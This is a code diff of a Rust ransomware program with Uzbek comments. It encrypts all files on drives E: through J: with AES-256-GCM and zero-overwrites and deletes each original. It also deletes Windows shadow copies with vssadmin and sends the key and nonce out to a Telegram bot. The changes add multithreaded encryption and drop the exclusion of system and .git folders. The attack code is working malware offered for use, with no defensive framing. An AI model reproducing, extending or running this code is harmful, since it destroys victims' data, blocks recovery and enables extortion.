@@ -6,29 +6,24 @@ use base64::{engine::general_purpose, Engine as _};
 use dotenv::dotenv;
 use reqwest::blocking::Client;
 use serde_json::json;
-use sha2::{Digest, Sha256}; // Kalit va nonce hosil qilish uchun
-use std::env;
-use std::fs::{self, File, OpenOptions};
-use std::io::{Read, Write};
-use std::path::{Path, PathBuf};
-use std::process::Command;
+use sha2::{Digest, Sha256};
+use std::{
+    env,
+    fs::{self, File, OpenOptions},
+    io::{Read, Write},
+    path::{Path, PathBuf},
+    process::Command,
+    sync::{Arc, Mutex, mpsc},
+    thread,
+};
 use walkdir::WalkDir;
-use aes_gcm::aead::generic_array::typenum::U12; // Nonce<U12> uchun
 
-// Tizim fayllarini va .git papkalarini shifrlamaslik uchun filtr
-const EXCLUDED_PATHS: [&str; 4] = [
-    "C:\\Windows",
-    "C:\\Program Files",
-    "C:\\Program Files (x86)",
-    "\\.git\\", // .git papkalarini chetlab o'tish
-];
-
-// Faylni shifrlash
+// Shifrlashni amalga oshiruvchi yordamchi
 fn encrypt_file(
     file_path: &Path,
     key: &Key<Aes256Gcm>,
-    nonce: &Nonce<U12>,
-) -> Result<(), Box<dyn std::error::Error>> {
+    nonce: &Nonce<aes_gcm::aead::generic_array::typenum::U12>,
+) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     // 1) Faylni o‘qish
     let mut f = File::open(file_path)?;
     let mut plaintext = Vec::new();
@@ -42,17 +37,14 @@ fn encrypt_file(
         .map_err(|e| format!("Encrypt error: {}", e))?;
     println!("[*] Shifrlanmoqda: {}", file_path.display());
 
-    // 3) .enc fayl nomini to‘g‘ri yasash: "file.txt" -> "file.txt.enc"
+    // 3) .enc fayl nomi
     let enc_path: PathBuf = {
         let parent = file_path.parent().unwrap_or_else(|| Path::new(""));
-        let name = file_path
-            .file_name()
-            .unwrap()
-            .to_string_lossy();
+        let name = file_path.file_name().unwrap().to_string_lossy();
         parent.join(format!("{}.enc", name))
     };
 
-    // 4) Shifrlangan ma’lumotni yangi .enc fayliga yozish
+    // 4) Yozish
     {
         let mut out = File::create(&enc_path)?;
         out.write_all(&ciphertext)?;
@@ -60,10 +52,9 @@ fn encrypt_file(
     }
     println!("[+] Yaratildi: {}", enc_path.display());
 
-    // 5) Agar .enc fayli muvaffaqiyatli yaratilgan bo‘lsa, originalni tozalash va o‘chirish
+    // 5) Originalni nol bilan to‘ldirib o‘chirish
     let meta = fs::metadata(&enc_path)?;
     if meta.len() > 0 {
-        // a) Faylni bir necha bor nol bilan to‘ldirish
         let mut orig = OpenOptions::new().write(true).open(file_path)?;
         let len = orig.metadata()?.len() as usize;
         let zeros = vec![0u8; len];
@@ -71,124 +62,104 @@ fn encrypt_file(
             orig.write_all(&zeros)?;
             orig.sync_all()?;
         }
-        // b) Asl faylni o‘chirish
         fs::remove_file(file_path)?;
         println!("[+] Original o‘chirildi: {}", file_path.display());
-    } else {
-        println!("[-] .enc fayli bo‘sh: {}, original o‘chirilmaydi", enc_path.display());
     }
 
     Ok(())
 }
 
-// Telegramga kalit va nonce yuborish
-fn send_to_telegram(key_b64: &str, nonce_b64: &str, telegram_token: &str, chat_id: &str) -> Result<(), Box<dyn std::error::Error>> {
-    let client = Client::new();
-    let url = format!("https://api.telegram.org/bot{}/sendMessage", telegram_token);
-    let payload = json!({
-        "chat_id": chat_id,
-        "text": format!("Shifrlash kaliti: {}\nNonce: {}", key_b64, nonce_b64)
-    });
-    client.post(&url).json(&payload).send()?;
-    println!("[+] Kalit va nonce Telegramga yuborildi");
-    Ok(())
-}
+// Asosiy dastur
+fn main() -> Result<(), Box<dyn std::error::Error>> {
+    dotenv().ok();
+    // Telegram sozlamalari
+    let telegram_token = env::var("TELEGRAM_TOKEN")?;
+    let chat_id = env::var("CHAT_ID")?;
 
-// Kalit va nonce ni faylga saqlash
-fn save_key_and_nonce(key_b64: &str, nonce_b64: &str) -> Result<(), Box<dyn std::error::Error>> {
-    let mut file = File::create("key.txt")?;
-    writeln!(file, "Shifrlash kaliti: {}\nNonce: {}", key_b64, nonce_b64)?;
-    println!("[+] Kalit va nonce key.txt fayliga saqlandi");
-    Ok(())
-}
+    // Shadow copy o'chirish (admin sifatida)
+    let _ = Command::new("vssadmin")
+        .args(["delete", "shadows", "/all", "/quiet"])
+        .status();
 
-// Barcha drayvlarni shifrlash
-fn encrypt_all_drives(telegram_token: &str, chat_id: &str) -> Result<(), Box<dyn std::error::Error>> {
-    // Kalitni "JasurFayllarmgaTegma" dan hosil qilish (32 bayt)
+    // 1) Kalit va nonce hosil qilish
     let mut hasher = Sha256::new();
     hasher.update("JasurFayllarmgaTegma");
-    let key_bytes: [u8; 32] = hasher.finalize().into();
-    let key: Key<Aes256Gcm> = key_bytes.into();
+    let key_bytes = hasher.finalize_reset();
+    let key = Arc::new(Key::<Aes256Gcm>::from_slice(&key_bytes).clone());
 
-    // Nonce ni "JasurFayllarmgaTegma" dan hosil qilish (12 bayt)
-    let mut hasher = Sha256::new();
     hasher.update("JasurFayllarmgaTegma");
-    let nonce_bytes: [u8; 12] = hasher.finalize()[..12].try_into()?;
-    let nonce = Nonce::from_slice(&nonce_bytes);
-    let key_b64 = general_purpose::STANDARD.encode(&key);
-    let nonce_b64 = general_purpose::STANDARD.encode(&nonce_bytes);
+    let nonce_bytes: [u8;12] = hasher.finalize()[..12].try_into()?;
+    let nonce = Arc::new(Nonce::from_slice(&nonce_bytes).clone());
 
-    // Kalit va nonce ni faylga saqlash
-    if let Err(e) = save_key_and_nonce(&key_b64, &nonce_b64) {
-        eprintln!("[-] Kalitni faylga saqlashda xato: {}", e);
+    // Kalit&nonce faylga saqlash
+    {
+        let k_b64 = general_purpose::STANDARD.encode(&key_bytes);
+        let n_b64 = general_purpose::STANDARD.encode(&nonce_bytes);
+        let mut f = File::create("key.txt")?;
+        writeln!(f, "Key: {}\nNonce: {}", k_b64, n_b64)?;
     }
 
-    // Windows drayvlarini aniqlash
-    let drives = ['E', 'F', 'G', 'H', 'I', 'J']
-        .iter()
-        .map(|&drive| format!("{}:\\", drive))
-        .filter(|drive| Path::new(drive).exists());
-
-    for drive in drives {
-        println!("[*] Drayv scan qilinmoqda: {}", drive);
-        for entry in WalkDir::new(&drive).into_iter().filter_map(|e| e.ok()) {
-            let path = entry.path();
-            let path_str = path.to_string_lossy();
-            // Tizim papkalari va .git papkalarini chetlab o'tish
-            if path.is_file() && !EXCLUDED_PATHS.iter().any(|excluded| path_str.contains(excluded)) {
-                match encrypt_file(path, &key, &nonce) {
-                    Ok(()) => println!("[+] Fayl muvaffaqiyatli shifrlanib o'chirildi: {}", path.display()),
-                    Err(e) => eprintln!("[-] Fayl shifrlashda xato {}: {}", path.display(), e),
+    // 2) Faylro'yxatni yig‘ish
+    let mut paths = Vec::new();
+    for drive in ['E','F','G','H','I','J'] {
+        let root = format!("{}:\\", drive);
+        if Path::new(&root).exists() {
+            for entry in WalkDir::new(&root).into_iter().filter_map(Result::ok) {
+                let p = entry.into_path();
+                if p.is_file() {
+                    paths.push(p);
                 }
             }
         }
     }
 
-    // Kalitni Telegramga yuborish (oflayn bo'lsa e'tiborsiz qoldiriladi)
-    if let Err(e) = send_to_telegram(&key_b64, &nonce_b64, telegram_token, chat_id) {
-        eprintln!("[-] Telegramga yuborishda xato (oflayn bo'lishi mumkin): {}. Kalit key.txt fayliga saqlandi.", e);
+    // 3) Max hardware threads sonini aniqlash
+    let max_threads = thread::available_parallelism()?.get();
+    println!("[*] Ishlaydigan thread soni: {}", max_threads);
+
+    // 4) Kanal va thread-larni yaratish
+    let (tx, rx) = mpsc::channel::<PathBuf>();
+    let rx = Arc::new(Mutex::new(rx));
+    let mut handles = Vec::with_capacity(max_threads as usize);
+
+    for _ in 0..max_threads {
+        let rx = Arc::clone(&rx);
+        let key = Arc::clone(&key);
+        let nonce = Arc::clone(&nonce);
+
+        let handle = thread::spawn(move || {
+            while let Ok(path) = rx.lock().unwrap().recv() {
+                if let Err(e) = encrypt_file(&path, &key, &nonce) {
+                    eprintln!("[-] Xato {}: {}", path.display(), e);
+                }
+            }
+        });
+        handles.push(handle);
     }
 
-    Ok(())
-}
-
-// Shadow copy o'chirish
-fn delete_shadow_copies() -> Result<(), Box<dyn std::error::Error>> {
-    let output = Command::new("vssadmin")
-        .args(["delete", "shadows", "/all", "/quiet"])
-        .output()?;
-    if !output.status.success() {
-        return Err(Box::new(std::io::Error::new(
-            std::io::ErrorKind::PermissionDenied,
-            format!(
-                "vssadmin buyrug'i muvaffaqiyatsiz: {}. Dasturni administrator sifatida ishga tushiring",
-                String::from_utf8_lossy(&output.stderr)
-            ),
-        )));
+    // 5) Fayl pathlarini kanalga yuborish
+    for p in paths {
+        tx.send(p)?;
     }
-    println!("[+] Shadow copy muvaffaqiyatli o'chirildi");
-    Ok(())
-}
+    // Endi hech narsa kelmaydi, thread‘lar loop’dan chiqadi
+    drop(tx);
 
-fn main() -> Result<(), Box<dyn std::error::Error>> {
-    // .env faylini yuklash
-    dotenv().ok();
-
-    // Telegram sozlamalari
-    let telegram_token = env::var("TELEGRAM_TOKEN").expect("TELEGRAM_TOKEN .env faylida bo'lishi kerak");
-    let chat_id = env::var("CHAT_ID").expect("CHAT_ID .env faylida bo'lishi kerak");
-
-    // Shadow copy o'chirish
-    if let Err(e) = delete_shadow_copies() {
-        eprintln!("[-] Shadow copy o'chirishda xato: {}", e);
+    // 6) Hammasi bitguncha kutish
+    for h in handles {
+        h.join().unwrap();
     }
 
-    // Shifrlashni darhol boshlash
-    if let Err(e) = encrypt_all_drives(&telegram_token, &chat_id) {
-        eprintln!("[-] Drayvlarni shifrlashda xato: {}", e);
-    } else {
-        println!("[+] Fayllar shifrlanib, kalit Telegramga yuborildi yoki key.txt fayliga saqlandi!");
-    }
+    // 7) Kalit&nonce Telegramga yuborish
+    let client = Client::new();
+    let k_b64 = general_purpose::STANDARD.encode(&key_bytes);
+    let n_b64 = general_purpose::STANDARD.encode(&nonce_bytes);
+    let _ = client.post(&format!("https://api.telegram.org/bot{}/sendMessage", telegram_token))
+        .json(&json!({
+            "chat_id": chat_id,
+            "text": format!("Key: {}\nNonce: {}", k_b64, n_b64)
+        }))
+        .send();
 
+    println!("[+] Barcha fayllar shifrlab bo‘lingach, kalit Telegramga yuborildi!");
     Ok(())
 }
